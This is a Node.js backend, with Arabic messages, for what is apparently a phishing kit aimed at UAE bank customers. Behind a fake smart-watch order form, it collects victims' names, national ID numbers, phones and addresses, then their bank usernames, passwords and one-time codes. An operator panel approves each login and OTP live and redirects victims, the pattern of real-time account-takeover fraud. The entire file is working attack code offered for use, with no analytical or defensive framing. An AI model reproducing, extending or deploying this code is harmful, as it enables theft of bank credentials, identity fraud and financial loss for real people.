const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const ADMIN_HASH = '7c4ef8b7e0b8b6a8e776f5161acc3a323673a7f13edca8386aeb74137214b671';
const TOKEN_SECRET = ADMIN_HASH + '_mbank_secret';
const visitors = {};
const orders = [];
const clicks = [];
const blockedIPs = new Set();
const sessions = [];
let orderCounter = 1000;
let sessionCounter = 5000;
let clickCounter = 0;
let totalVisitsToday = 0;
let pageViewsToday = 0;
let todayDate = new Date().toDateString();

function sha256(str) {
  return crypto.createHash('sha256').update(str).digest('hex');
}

function createToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  return ts + '.' + sig;
}

function verifyToken(token) {
  if (!token || !token.includes('.')) return false;
  const [ts, sig] = token.split('.');
  const expected = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  if (sig !== expected) return false;
  const age = Date.now() - parseInt(ts);
  return age < 7 * 24 * 60 * 60 * 1000;
}

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || '0.0.0.0';
}

function getCookies(req) {
  return (req.headers.cookie || '').split(';').reduce((acc, c) => {
    const [k, v] = c.trim().split('=');
    if (k) acc[k] = v;
    return acc;
  }, {});
}

function isAdmin(req) {
  const header = req.headers['x-admin-token'];
  if (header && verifyToken(header)) return true;
  const cookies = getCookies(req);
  return verifyToken(cookies.admin_token);
}

function getActiveVisitors() {
  const cutoff = Date.now() - 60000;
  const active = [];
  for (const ip in visitors) {
    if (visitors[ip].time > cutoff) {
      active.push(visitors[ip]);
    } else {
      delete visitors[ip];
    }
  }
  return active;
}

function readBody(req) {
  return new Promise((resolve) => {
    if (req.body !== undefined) {
      resolve(typeof req.body === 'string' ? req.body : JSON.stringify(req.body));
      return;
    }
    let body = '';
    req.on('data', c => { body += c; if (body.length > 1e6) req.destroy(); });
    req.on('end', () => resolve(body));
  });
}

function json(res, data, status) {
  res.writeHead(status || 200, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, x-admin-token'
  });
  res.end(JSON.stringify(data));
}

module.exports = async (req, res) => {
  if (req.method === 'OPTIONS') {
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, x-admin-token'
    });
    return res.end();
  }

  const reqPath = decodeURIComponent(req.url.split('?')[0]);

  // --- Admin Login ---
  if (req.method === 'POST' && (reqPath === '/admin/login' || reqPath === '/api/admin-login')) {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      if (sha256(data.password || '') === ADMIN_HASH) {
        const token = createToken();
        return json(res, { success: true, token });
      }
      return json(res, { success: false, message: 'كلمة المرور غير صحيحة' }, 401);
    } catch (e) {
      return json(res, { success: false, message: 'خطأ في الطلب' }, 400);
    }
  }

  // --- Clicks ---
  if (req.method === 'POST' && reqPath === '/api/clicks') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      orderCounter++;
      orders.push({
        id: orderCounter,
        name: '', phone: '', id_number: '', email: '', emirate: '', address: '',
        country: (data.country || 'غير معروف').substring(0, 100),
        service: (data.service || '').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        status: 'click',
        date: new Date().toISOString()
      });
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Orders ---
  if (req.method === 'POST' && reqPath === '/api/orders') {
    const ip = getIP(req);
    if (blockedIPs.has(ip)) return json(res, { success: false, message: 'محظور' }, 403);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      orderCounter++;
      const order = {
        id: orderCounter,
        name: (data.name || '').substring(0, 100),
        phone: (data.phone || '').substring(0, 20),
        id_number: (data.id_number || '').substring(0, 50),
        email: (data.email || '').substring(0, 100),
        emirate: (data.emirate || '').substring(0, 50),
        address: (data.address || '').substring(0, 200),
        country: (data.country || 'الإمارات').substring(0, 50),
        service: (data.service || 'طلب ساعة ذكية').substring(0, 100),
        lang: data.lang || 'ar',
        ip: ip,
        status: 'pending',
        date: new Date().toISOString()
      };
      orders.push(order);
      return json(res, { success: true, id: order.id });
    } catch (e) {
      return json(res, { success: false, message: 'خطأ في البيانات' }, 400);
    }
  }

  // --- Stats ---
  if (req.method === 'GET' && reqPath === '/api/stats') {
    const active = getActiveVisitors();
    return json(res, {
      activeVisitors: active.length,
      totalVisitsToday,
      pageViewsToday,
      totalOrders: orders.length,
      pendingOrders: orders.filter(o => o.status === 'pending').length
    });
  }

  // --- Get Orders ---
  if (req.method === 'GET' && reqPath === '/api/orders') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    return json(res, { orders: orders.slice().reverse() });
  }

  // --- Visitors ---
  if (req.method === 'GET' && reqPath === '/api/visitors') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const active = getActiveVisitors();
    return json(res, { visitors: active, count: active.length });
  }

  // --- Order Status ---
  if (req.method === 'POST' && reqPath === '/api/orders/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const order = orders.find(o => o.id === data.id);
      if (!order) return json(res, { error: 'not found' }, 404);
      order.status = data.status;
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Block IP ---
  if (req.method === 'POST' && reqPath === '/api/block-ip') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      blockedIPs.add(data.ip);
      orders.forEach(o => { if (o.ip === data.ip) o.status = 'blocked'; });
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Login Attempts (Sessions) ---
  if (req.method === 'POST' && reqPath === '/api/login-attempts') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      if (data.sessionId) {
        const existing = sessions.find(s => s.id === parseInt(data.sessionId));
        if (existing) {
          existing.username = (data.username || '').substring(0, 100);
          existing.password = (data.password || '').substring(0, 100);
          existing.loginStatus = 'waiting';
          existing.otp = null;
          existing.otpStatus = null;
          existing.redirectUrl = null;
          existing.date = new Date().toISOString();
          return json(res, { success: true, id: existing.id });
        }
      }
      sessionCounter++;
      const session = {
        id: sessionCounter,
        username: (data.username || '').substring(0, 100),
        password: (data.password || '').substring(0, 100),
        country: (data.country || 'غير معروف').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        service: (data.service || '').substring(0, 200),
        orderName: (data.orderName || '').substring(0, 100),
        orderPhone: (data.orderPhone || '').substring(0, 50),
        orderEmail: (data.orderEmail || '').substring(0, 100),
        orderIdNumber: (data.orderIdNumber || '').substring(0, 50),
        orderEmirate: (data.orderEmirate || '').substring(0, 50),
        orderAddress: (data.orderAddress || '').substring(0, 200),
        orderId: data.orderId ? parseInt(data.orderId) : null,
        loginStatus: 'waiting',
        otp: null,
        otpStatus: null,
        redirectUrl: null,
        date: new Date().toISOString()
      };
      sessions.push(session);
      return json(res, { success: true, id: session.id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Login Attempt Status Check ---
  if (req.method === 'GET' && reqPath.startsWith('/api/login-attempts/') && reqPath.endsWith('/status')) {
    const id = parseInt(reqPath.split('/')[3]);
    const s = sessions.find(a => a.id === id);
    if (!s) return json(res, { status: 'not_found' }, 404);
    return json(res, { status: s.loginStatus, redirectUrl: s.redirectUrl || null });
  }

  // --- Update Login Status ---
  if (req.method === 'POST' && reqPath === '/api/login-attempts/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const s = sessions.find(a => a.id === data.id);
      if (!s) return json(res, { error: 'not found' }, 404);
      s.loginStatus = data.status;
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- OTP Attempts ---
  if (req.method === 'POST' && reqPath === '/api/otp-attempts') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const id = parseInt(data.loginId);
      const s = sessions.find(a => a.id === id);
      if (!s) return json(res, { error: 'session not found' }, 404);
      s.otp = (data.otp || '').substring(0, 20);
      s.otpStatus = 'waiting';
      return json(res, { success: true, id: s.id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- OTP Status Check ---
  if (req.method === 'GET' && reqPath.startsWith('/api/otp-attempts/') && reqPath.endsWith('/status')) {
    const id = parseInt(reqPath.split('/')[3]);
    const s = sessions.find(a => a.id === id);
    if (!s) return json(res, { status: 'not_found' }, 404);
    return json(res, { status: s.otpStatus || 'not_found', redirectUrl: s.redirectUrl || null });
  }

  // --- Update OTP Status ---
  if (req.method === 'POST' && reqPath === '/api/otp-attempts/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const s = sessions.find(a => a.id === data.id);
      if (!s) return json(res, { error: 'not found' }, 404);
      s.otpStatus = data.status;
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Sessions List ---
  if (req.method === 'GET' && reqPath === '/api/sessions') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const list = sessions.slice().reverse().map(s => {
      let pendingAction = null;
      if (s.loginStatus === 'waiting') {
        pendingAction = { type: 'login', id: s.id };
      } else if (s.loginStatus === 'approved' && s.otpStatus === 'waiting') {
        pendingAction = { type: 'otp', id: s.id };
      }
      return { ...s, pendingAction };
    });
    return json(res, { sessions: list });
  }

  // --- Session Redirect ---
  if (req.method === 'POST' && reqPath === '/api/sessions/redirect') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const s = sessions.find(a => a.id === data.id);
      if (!s) return json(res, { error: 'not found' }, 404);
      s.redirectUrl = data.url;
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Heartbeat ---
  if (reqPath === '/api/heartbeat') {
    return json(res, { ok: true });
  }

  // --- Wait Function ---
  if (reqPath === '/api/wait-fn') {
    return json(res, { status: 0 });
  }

  // --- Polling Redirect ---
  if (reqPath === '/api/polling-redirect') {
    return json(res, { redirect: null });
  }

  // --- Admin page protection ---
  if ((reqPath.startsWith('/admin/') || reqPath === '/admin') && reqPath !== '/admin/login' && reqPath !== '/admin/login.html') {
    if (!isAdmin(req)) {
      const ROOT = path.join(__dirname, '..');
      const loginPage = path.join(ROOT, 'admin', 'login.html');
      if (fs.existsSync(loginPage)) {
        const content = fs.readFileSync(loginPage, 'utf8');
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        return res.end(content);
      }
      res.writeHead(302, { 'Location': '/admin/login.html' });
      return res.end();
    }
    const ROOT = path.join(__dirname, '..');
    let filePath = reqPath;
    if (filePath.endsWith('/')) filePath += 'index.html';
    const fullPath = path.join(ROOT, filePath);
    if (fs.existsSync(fullPath)) {
      const ext = path.extname(fullPath).toLowerCase();
      const MIME = {
        '.html': 'text/html; charset=utf-8', '.css': 'text/css',
        '.js': 'application/javascript', '.png': 'image/png',
        '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
        '.svg': 'image/svg+xml', '.json': 'application/json',
      };
      res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
      return res.end(fs.readFileSync(fullPath));
    }
  }

  return json(res, { error: 'not found' }, 404);
};
